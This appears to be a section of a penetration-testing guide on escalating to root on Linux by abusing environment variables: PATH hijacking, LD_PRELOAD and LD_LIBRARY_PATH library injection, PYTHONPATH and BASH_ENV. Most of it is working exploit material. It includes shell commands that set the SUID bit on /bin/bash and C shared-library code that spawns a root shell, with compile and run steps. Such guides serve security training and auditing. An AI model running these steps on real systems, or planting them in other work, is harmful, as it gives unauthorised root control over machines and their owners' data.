# Environment Variables Abuse

This section covers techniques to exploit environment variables for privilege escalation.

## PATH Variable Manipulation

The PATH environment variable contains a list of directories that are searched when you execute a command. If a program runs with higher privileges and relies on relative paths to execute binaries, it may be vulnerable.

### Checking Current PATH

```bash
echo $PATH
```

### Exploitation Technique

1. Identify a program running with elevated privileges that calls another program without specifying the full path:

```bash
# For example, a SUID binary that uses system("service apache2 start")
strings /path/to/suid_binary
ltrace /path/to/suid_binary
```

2. Create a malicious version of the called program in a writable directory:

```bash
cd /tmp
echo '#!/bin/bash' > service
echo 'chmod +s /bin/bash' >> service
chmod +x service
```

3. Modify the PATH variable to include your directory first:

```bash
export PATH=/tmp:$PATH
```

4. Run the vulnerable SUID program, which will execute your malicious version instead:

```bash
/path/to/suid_binary
# After this runs, check if /bin/bash now has the SUID bit
ls -l /bin/bash
/bin/bash -p
```

## LD_PRELOAD and LD_LIBRARY_PATH

These environment variables control which shared libraries are loaded when a program runs.

### LD_PRELOAD

LD_PRELOAD allows you to load a custom shared library before all others. If you can control this while running a command with sudo, you can potentially escalate privileges.

1. Check if LD_PRELOAD is preserved with sudo:

```bash
sudo -l
# Look for env_keep+=LD_PRELOAD
```

2. Create a malicious shared library:

```bash
cat << EOF > /tmp/evil.c
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>

void _init() {
    if (geteuid() == 0) {
        setuid(0);
        setgid(0);
        system("/bin/bash -p");
    }
}
EOF

gcc -fPIC -shared -o /tmp/evil.so /tmp/evil.c -nostartfiles
```

3. Use LD_PRELOAD with sudo to execute a command:

```bash
sudo LD_PRELOAD=/tmp/evil.so find
```

### LD_LIBRARY_PATH

LD_LIBRARY_PATH specifies directories where the program should look for libraries. This can be abused if a program searches for libraries in a specific order.

1. Check if a SUID binary uses shared libraries:

```bash
ldd /path/to/suid_binary
```

2. Create a malicious library with the same name as one of the used libraries:

```bash
cat << EOF > /tmp/evil.c
#include <stdio.h>
#include <stdlib.h>

void function_name() {
    setuid(0);
    setgid(0);
    system("/bin/bash -p");
}
EOF

gcc -fPIC -shared -o /tmp/libname.so.1 /tmp/evil.c
```

3. Set LD_LIBRARY_PATH to your directory:

```bash
export LD_LIBRARY_PATH=/tmp
```

4. Execute the SUID binary:

```bash
/path/to/suid_binary
```

## Sudo Environment Variables

Sudo may preserve certain environment variables, which can be abused if misconfigured.

### Check Preserved Variables

```bash
sudo -l
# Look for env_keep entries
```

### Common Exploitable Variables

- `LD_PRELOAD` - As explained above
- `LD_LIBRARY_PATH` - As explained above
- `PATH` - Can lead to executing malicious binaries
- `PYTHONPATH` - Can be used to load malicious Python modules
- `PERL5LIB` - Can be used to load malicious Perl modules

### Example with PYTHONPATH

If you can run a Python script with sudo:

```bash
# Check if you can run a Python script with sudo
sudo -l

# Create a malicious Python module
echo 'import os; os.system("/bin/bash")' > /tmp/evil.py

# Set PYTHONPATH
export PYTHONPATH=/tmp

# Run the Python script with sudo
sudo python -c "import evil"
```

## Shell Environment Variables

Some programs can inherit shell functionality from environment variables:

### BASH_ENV Exploitation

If a SUID binary executes `sh` internally, it might source `BASH_ENV`:

```bash
cat << EOF > /tmp/script.sh
chmod +s /bin/bash
EOF
chmod +x /tmp/script.sh
export BASH_ENV=/tmp/script.sh
/path/to/suid_binary  # If this runs sh internally
```

## Additional Resources

- [HackTricks - Linux Privilege Escalation](https://book.hacktricks.xyz/linux-hardening/privilege-escalation)
- [GTFOBins](https://gtfobins.github.io/) - Unix binaries that can be exploited
- [Linux Privilege Escalation - Environment Variables](https://www.hackingarticles.in/linux-privilege-escalation-using-path-variable/) 